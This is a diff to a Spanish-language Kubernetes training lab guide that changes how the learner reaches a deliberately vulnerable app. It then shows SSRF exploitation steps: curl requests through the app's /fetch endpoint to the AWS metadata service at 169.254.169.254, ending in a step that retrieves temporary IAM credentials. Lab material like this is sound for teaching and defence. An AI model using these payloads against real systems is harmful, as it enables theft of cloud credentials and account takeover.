@@ -28,27 +28,30 @@ kubectl get pods -n lab1-ssrf -w
 
 ## Fase 2: Explotación SSRF
 
-### Paso 1: Acceder a la app (Minikube)
+### Paso 1: Acceder a la app
 
 ```bash
-# Opción A — usar minikube service (abre el navegador automáticamente)
-minikube service ssrf-app-svc -n lab1-ssrf
+# Obtener la IP interna del nodo
+kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}'
+# Ejemplo de salida: 192.168.49.2
 
-# Opción B — obtener la URL manualmente
-minikube service ssrf-app-svc -n lab1-ssrf --url
-# Ejemplo de salida: http://192.168.49.2:31082
+# Guardar en una variable para los siguientes pasos
+export NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
+echo "Node IP: $NODE_IP"
 
-# Opción C — port-forward (funciona en cualquier entorno)
-kubectl port-forward svc/ssrf-app-svc 8080:8080 -n lab1-ssrf &
-# Luego acceder a http://localhost:8080
+# Verificar el NodePort asignado al servicio
+kubectl get svc ssrf-app-svc -n lab1-ssrf
+# El NodePort es 31082
+
+# Acceder a la app via navegador o curl
+curl "http://$NODE_IP:31082"
 ```
 
-Guardar la URL en una variable para los siguientes pasos:
-
-```bash
-export APP_URL=$(minikube service ssrf-app-svc -n lab1-ssrf --url)
-echo "App disponible en: $APP_URL"
-```
+> **Alternativa con port-forward** (si el NodePort no es accesible):
+> ```bash
+> kubectl port-forward svc/ssrf-app-svc 8080:8080 -n lab1-ssrf &
+> # Luego acceder a http://localhost:8080
+> ```
 
 ### Paso 2: Probar SSRF al IMDS (AWS)
 
@@ -56,13 +59,13 @@ echo "App disponible en: $APP_URL"
 # Desde el navegador o curl:
 
 # Listar metadata disponible
-curl "$APP_URL/fetch?url=http://169.254.169.254/latest/meta-data/"
+curl "http://$NODE_IP:31082/fetch?url=http://169.254.169.254/latest/meta-data/"
 
 # Obtener el IAM role del nodo
-curl "$APP_URL/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl "http://$NODE_IP:31082/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 
 # Robar credenciales temporales
-curl "$APP_URL/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>"
+curl "http://$NODE_IP:31082/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>"
 # → AccessKeyId, SecretAccessKey, Token
 ```
 
